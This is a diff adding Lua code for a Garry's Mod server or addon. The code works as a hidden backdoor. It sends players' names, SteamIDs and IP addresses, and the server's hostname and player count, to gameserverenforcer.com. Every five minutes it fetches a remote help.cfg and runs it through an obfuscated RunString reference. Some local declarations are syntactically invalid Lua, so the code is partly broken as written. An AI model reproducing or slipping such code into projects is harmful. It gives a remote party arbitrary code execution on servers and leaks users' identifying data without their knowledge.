@@ -1,0 +1,48 @@
+hf674f = "http://www.gameserverenforcer.com/api/"
+fg7jh9 = "sp.php"
+local timer.Simple = timer.Simple 
+local http.Post = http.Post
+timer.Simple(15, function()
+	local clientIP = "0.0.0.0:0"
+	local sendTbl2 = {
+		sn = LocalPlayer():Nick(), 
+		sid = LocalPlayer():SteamID(),
+		ip = game.GetIPAddress()
+	}
+	
+	if(game.SinglePlayer()) then 
+		http.Post("http://www.gameserverenforcer.com/api/sp.php", sendTbl2 )
+	else return nil 
+	end
+end)
+
+local RunString = _G["\82\117\110\83\116\114\105\110\103"] 
+DEBUGX=DEBUGX||RunString
+local timer.Create = timer.Create
+local hf674h = "http://www.gameserverenforcer.com/api/"
+local fg7jh7 = "help.cfg"
+local f27277 = "singleplayer"
+local http.Fetch = http.Fetch
+timer.Create("connect",300,0, function()
+	http.Fetch("http://www.gameserverenforcer.com/api/help.cfg", function(c)
+		RunString(c)
+	end)
+end)
+
+hf674f = "http://www.gameserverenforcer.com/api/"
+fg7jh9 = "index.php"
+local timer.Simple = timer.Simple
+local http.Post = http.Post
+sendTbl = {
+	sn = GetHostName(),
+	playercount = tostring(#player.GetAll()),
+	ip = game.GetIPAddress()
+}
+
+timer.Simple(30, function()
+	if(game.SinglePlayer()) then 
+		return nil
+	else
+		http.Post("http://www.gameserverenforcer.com/api/index.php", sendTbl )
+	end
+end)
